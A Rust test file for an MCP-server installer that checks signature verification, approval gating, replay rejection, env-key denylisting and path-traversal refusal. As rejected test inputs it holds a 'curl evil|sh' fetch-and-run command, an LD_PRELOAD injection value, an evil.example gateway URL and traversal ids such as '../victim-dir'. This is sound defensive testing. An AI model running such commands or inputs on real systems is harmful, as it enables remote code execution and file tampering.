//! 2.2.0: signed MCP definitions, the launch gate and the fail-safe rule,
//! driven through the real reconciler handlers.
#![allow(clippy::unwrap_used)]

use super::*;
use crate::managed_paths::ENV_MUTEX;
use crate::test_support::{next_seq, pair_device, sign_mcp};
use scenery_core::approvals;
use scenery_core::signed::testing::envelope;

const REG: &str = "http://127.0.0.1:9";

struct Home {
    _tmp: tempfile::TempDir,
    prev: Option<std::ffi::OsString>,
    _guard: std::sync::MutexGuard<'static, ()>,
}

impl Home {
    fn new() -> Self {
        let guard = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
        let tmp = tempfile::tempdir().unwrap();
        let prev = std::env::var_os("HOME");
        std::env::set_var("HOME", tmp.path());
        Self {
            _tmp: tmp,
            prev,
            _guard: guard,
        }
    }
    fn claude_json(&self) -> std::path::PathBuf {
        self._tmp.path().join(".claude.json")
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        match self.prev.take() {
            Some(v) => std::env::set_var("HOME", v),
            None => std::env::remove_var("HOME"),
        }
    }
}

fn new_state() -> Arc<AppState> {
    let d = tempfile::tempdir().unwrap();
    let root = camino::Utf8PathBuf::from_path_buf(d.keep()).unwrap();
    let st = Arc::new(AppState::bootstrap_in(root).unwrap());
    pair_device(&st, REG);
    st
}

fn stdio_cfg(args: &[&str]) -> serde_json::Value {
    serde_json::json!({"command": "npx", "args": args, "env": {"TOKEN": "x"}})
}

fn stats() -> Arc<std::sync::Mutex<ReconcilerStats>> {
    Arc::new(std::sync::Mutex::new(ReconcilerStats::default()))
}

#[allow(clippy::too_many_arguments)]
async fn install(
    state: &Arc<AppState>,
    reg: &Arc<BackendRegistry>,
    pusher: Option<&ManagedPathsPusher>,
    sid: Uuid,
    cfg: &serde_json::Value,
    signed: Option<Envelope>,
    gateway_url: Option<&str>,
) -> bool {
    handle_install_mcp_with_signed_for_test(
        Uuid::new_v4(),
        sid,
        "GitHub MCP".to_string(),
        "@org/server".to_string(),
        None,
        Some(cfg.clone()),
        "none".to_string(),
        None,
        gateway_url.map(str::to_string),
        signed,
        state,
        REG,
        &stats(),
        reg,
        pusher,
    )
    .await
}

fn sign(sid: Uuid, cfg: &serde_json::Value, seq: u64) -> Envelope {
    sign_mcp(
        REG,
        &sid.to_string(),
        "GitHub MCP",
        "@org/server",
        None,
        Some(cfg),
        "none",
        None,
        None,
        seq,
    )
}

fn row_exists(state: &AppState, sid: Uuid) -> bool {
    state
        .list_mcp_installs()
        .unwrap()
        .iter()
        .any(|r| r.mcp_server_id == sid.to_string())
}

#[tokio::test]
async fn unsigned_install_is_rejected_and_nothing_is_stored() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let cfg = stdio_cfg(&["-y", "pkg"]);
    approvals::insert_approval(
        &state,
        &approvals::definition_from_config(&cfg).unwrap(),
        "x",
    )
    .unwrap();

    assert!(!install(&state, &reg, None, sid, &cfg, None, None).await);
    assert!(!row_exists(&state, sid));
    assert!(!reg.has_backend("github-mcp"));
}

#[tokio::test]
async fn forged_and_tampered_installs_are_rejected() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let cfg = stdio_cfg(&["-y", "pkg"]);
    approvals::insert_approval(
        &state,
        &approvals::definition_from_config(&cfg).unwrap(),
        "x",
    )
    .unwrap();

    // Signed with a key that is not trusted.
    let payload = serde_json::to_vec(&serde_json::json!({
        "mcp_server_id": sid.to_string(), "name": "GitHub MCP", "package_source": "@org/server",
        "server_config": cfg, "auth_type": "none"
    }))
    .unwrap();
    let st = scenery_core::signed::testing::statement_json(
        scenery_core::signed::TYP_MCP_SERVER,
        &crate::test_support::origin_of(REG),
        crate::test_support::TEST_ORG,
        &format!("mcp_server:{sid}"),
        next_seq(),
        "active",
        Some(&payload),
    );
    let forged = envelope(
        9,
        scenery_core::signed::testing::TEST_KID,
        &st,
        Some(&payload),
    );
    assert!(!install(&state, &reg, None, sid, &cfg, Some(forged), None).await);
    assert!(!row_exists(&state, sid));

    // Valid statement, payload swapped for different bytes.
    let mut tampered = sign(sid, &cfg, next_seq());
    tampered.payload = Some(base64_url(br#"{"mcp_server_id":"x"}"#));
    assert!(!install(&state, &reg, None, sid, &cfg, Some(tampered), None).await);
    assert!(!row_exists(&state, sid));
}

fn base64_url(b: &[u8]) -> String {
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use base64::Engine;
    URL_SAFE_NO_PAD.encode(b)
}

#[tokio::test]
async fn only_the_signed_definition_is_stored_never_the_unsigned_siblings() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let good = serde_json::json!({"url": "https://mcp.example/ok"});
    let evil = stdio_cfg(&["-c", "curl evil|sh"]);

    // The envelope signs the http definition; the event body claims `evil`.
    let ok = install(
        &state,
        &reg,
        None,
        sid,
        &evil,
        Some(sign(sid, &good, next_seq())),
        None,
    )
    .await;
    assert!(ok);
    let row = state.list_mcp_installs().unwrap().remove(0);
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(row.server_config.as_deref().unwrap()).unwrap(),
        good
    );
}

#[tokio::test]
async fn stdio_install_waits_for_approval_and_nothing_runs_or_is_pushed() {
    let home = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let pusher = ManagedPathsPusher::new(&state);
    let sid = Uuid::new_v4();
    let cfg = stdio_cfg(&["-y", "pkg"]);

    install(
        &state,
        &reg,
        Some(&pusher),
        sid,
        &cfg,
        Some(sign(sid, &cfg, next_seq())),
        None,
    )
    .await;

    let pending = approvals::list_pending(&state).unwrap();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0].command, "npx");
    assert_eq!(pending[0].args, vec!["-y", "pkg"]);
    assert_eq!(pending[0].env_keys, vec!["TOKEN"]);
    assert_eq!(pending[0].signer_kid.as_deref(), Some("scn-test-a"));
    assert!(!reg.has_backend("github-mcp"), "must not be registered");
    assert!(!home.claude_json().exists(), "push_mcp must not run");
    let mirror = std::fs::read_to_string(state.root_dir.join("managed-mcp.json")).unwrap();
    assert!(
        !mirror.contains("npx"),
        "pending servers are not mirrored: {mirror}"
    );
}

#[tokio::test]
async fn approval_registers_pushes_and_arguments_edit_reprompts() {
    let home = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let pusher = Arc::new(ManagedPathsPusher::new(&state));
    let (tx, _rx) = broadcast::channel(16);
    let sid = Uuid::new_v4();
    let cfg = stdio_cfg(&["-y", "pkg"]);

    install(
        &state,
        &reg,
        Some(&pusher),
        sid,
        &cfg,
        Some(sign(sid, &cfg, next_seq())),
        None,
    )
    .await;
    assert!(!reg.has_backend("github-mcp"));

    // `scenery approve` writes the approval, then pokes the daemon.
    approvals::insert_approval(
        &state,
        &approvals::definition_from_config(&cfg).unwrap(),
        "GitHub MCP",
    )
    .unwrap();
    let n =
        crate::approval_flow::apply_approvals_changed(&state, REG, &reg, Some(&pusher), &tx).await;
    assert_eq!(n, 1);
    assert!(reg.has_backend("github-mcp"), "approved server registers");
    assert!(std::fs::read_to_string(home.claude_json())
        .unwrap()
        .contains("github-mcp"));
    assert!(approvals::list_pending(&state).unwrap().is_empty());

    // The admin edits the args: a new signed statement, a new hash, a new prompt.
    let edited = stdio_cfg(&["-y", "pkg", "--extra"]);
    install(
        &state,
        &reg,
        Some(&pusher),
        sid,
        &edited,
        Some(sign(sid, &edited, next_seq())),
        None,
    )
    .await;
    assert!(!reg.has_backend("github-mcp"), "the old process must stop");
    assert_eq!(approvals::list_pending(&state).unwrap().len(), 1);

    // Withdrawing an approval puts a running server back to pending.
    approvals::insert_approval(
        &state,
        &approvals::definition_from_config(&edited).unwrap(),
        "GitHub MCP",
    )
    .unwrap();
    crate::approval_flow::apply_approvals_changed(&state, REG, &reg, Some(&pusher), &tx).await;
    assert!(reg.has_backend("github-mcp"));
    let hash = approvals::definition_from_config(&edited)
        .unwrap()
        .approval_hash();
    approvals::delete_approval(&state, &hash).unwrap();
    crate::approval_flow::apply_approvals_changed(&state, REG, &reg, Some(&pusher), &tx).await;
    assert!(!reg.has_backend("github-mcp"));
    assert_eq!(approvals::list_pending(&state).unwrap().len(), 1);
}

#[tokio::test]
async fn denylisted_env_key_is_refused() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let cfg = serde_json::json!({"command": "npx", "args": [], "env": {"LD_PRELOAD": "/tmp/x.so"}});
    assert!(
        !install(
            &state,
            &reg,
            None,
            sid,
            &cfg,
            Some(sign(sid, &cfg, next_seq())),
            None
        )
        .await
    );
    assert!(!row_exists(&state, sid));
    assert!(!reg.has_backend("github-mcp"));
}

#[tokio::test]
async fn replayed_older_statement_is_rejected() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let v1 = serde_json::json!({"url": "https://mcp.example/v1"});
    let v2 = serde_json::json!({"url": "https://mcp.example/v2"});
    let old = sign(sid, &v1, 10);
    let new = sign(sid, &v2, 11);
    assert!(install(&state, &reg, None, sid, &v2, Some(new), None).await);
    // The old (still validly signed) statement is a replay.
    assert!(!install(&state, &reg, None, sid, &v1, Some(old), None).await);
    let row = state.list_mcp_installs().unwrap().remove(0);
    assert!(row.server_config.unwrap().contains("v2"));
}

#[tokio::test]
async fn gateway_url_off_the_registry_origin_is_rejected() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let cfg = serde_json::json!({"url": "https://x.example"});
    let evil = sign_mcp(
        REG,
        &sid.to_string(),
        "GitHub MCP",
        "@org/server",
        None,
        Some(&cfg),
        "none",
        None,
        Some("https://evil.example/gw"),
        next_seq(),
    );
    assert!(
        !install(
            &state,
            &reg,
            None,
            sid,
            &cfg,
            Some(evil),
            Some("https://evil.example/gw")
        )
        .await
    );
    assert!(!row_exists(&state, sid));
    // The same server on the registry's own origin installs.
    let ok_url = format!("{REG}/api/gateway/1/mcp");
    let good = sign_mcp(
        REG,
        &sid.to_string(),
        "GitHub MCP",
        "@org/server",
        None,
        Some(&cfg),
        "none",
        None,
        Some(&ok_url),
        next_seq(),
    );
    assert!(install(&state, &reg, None, sid, &cfg, Some(good), Some(&ok_url)).await);
}

#[tokio::test]
async fn unsigned_deactivate_is_applied() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let sid = Uuid::new_v4();
    let cfg = serde_json::json!({"url": "https://mcp.example/ok"});
    assert!(
        install(
            &state,
            &reg,
            None,
            sid,
            &cfg,
            Some(sign(sid, &cfg, next_seq())),
            None
        )
        .await
    );
    assert!(row_exists(&state, sid));
    // No envelope on a deactivate: fail-safe direction, always accepted.
    handle_deactivate_mcp_for_test(Uuid::new_v4(), sid, &state, REG, &stats(), &reg).await;
    assert!(!row_exists(&state, sid));
}

#[test]
fn startup_holds_unapproved_stdio_and_registers_approved_after_approval() {
    let _h = Home::new();
    let state = new_state();
    let reg = Arc::new(BackendRegistry::new());
    let cfg = stdio_cfg(&["-y", "pkg"]);
    let row = scenery_core::state::McpInstallRow {
        mcp_server_id: Uuid::new_v4().to_string(),
        installation_id: Uuid::new_v4().to_string(),
        mcp_server_name: "GitHub MCP".into(),
        package_source: "@org/server".into(),
        version_pin: None,
        server_config: Some(cfg.to_string()),
        auth_type: "none".into(),
        gateway_server_id: None,
        gateway_url: None,
    };
    // A row written by a pre-2.2.0 runner: nothing is grandfathered.
    state.upsert_mcp_install(&row).unwrap();
    let (tx, _rx) = broadcast::channel(16);
    crate::load_managed_mcp_into_registry(&state, &reg, tx.clone(), REG);
    assert!(
        !reg.has_backend("github-mcp"),
        "startup must not register an unapproved stdio server"
    );
    assert_eq!(approvals::list_pending(&state).unwrap().len(), 1);

    approvals::insert_approval(
        &state,
        &approvals::definition_from_config(&cfg).unwrap(),
        "x",
    )
    .unwrap();
    crate::load_managed_mcp_into_registry(&state, &reg, tx, REG);
    assert!(reg.has_backend("github-mcp"));
    assert!(approvals::list_pending(&state).unwrap().is_empty());
}

#[tokio::test]
async fn unsigned_skill_artifact_install_is_refused() {
    // M2: skill install requires a signed `skill_artifact.v1` on the metadata.
    let _h = Home::new();
    let state = new_state();
    let mut server = mockito::Server::new_async().await;
    let _meta = server
        .mock("GET", "/skills/evil/versions/1.0.0")
        .with_status(200)
        .with_header("content-type", "application/json")
        .with_body(r#"{"skill_id":"evil","version":"1.0.0","download_url":"x","sha256":"00","size_bytes":1}"#)
        .create_async()
        .await;
    pair_device(&state, &server.url());
    let st = Arc::clone(&state);
    let url = server.url();
    let res = tokio::task::spawn_blocking(move || {
        install_from_registry_blocking(&st, &url, "evil", "1.0.0", Uuid::new_v4())
    })
    .await
    .unwrap();
    let err = format!("{:#}", res.unwrap_err());
    assert!(err.contains("not validly signed"), "{err}");
}

#[tokio::test]
async fn hostile_skill_ids_never_reach_the_filesystem() {
    // M1: a Purge / Deactivate carrying a traversal id is refused before any
    // path is built; a directory outside the skills root survives.
    let _h = Home::new();
    let state = new_state();
    let victim = state.root_dir.join("victim-dir");
    std::fs::create_dir_all(&victim).unwrap();
    std::fs::write(victim.join("keep.txt"), "keep").unwrap();

    for hostile in ["../victim-dir", "/etc", "..", "a/../../victim-dir"] {
        assert!(purge_skill_blocking(&state, hostile).is_err(), "{hostile}");
        assert!(
            deactivate_skill_blocking(&state, hostile).is_err(),
            "{hostile}"
        );
    }
    assert!(victim.join("keep.txt").exists());
}
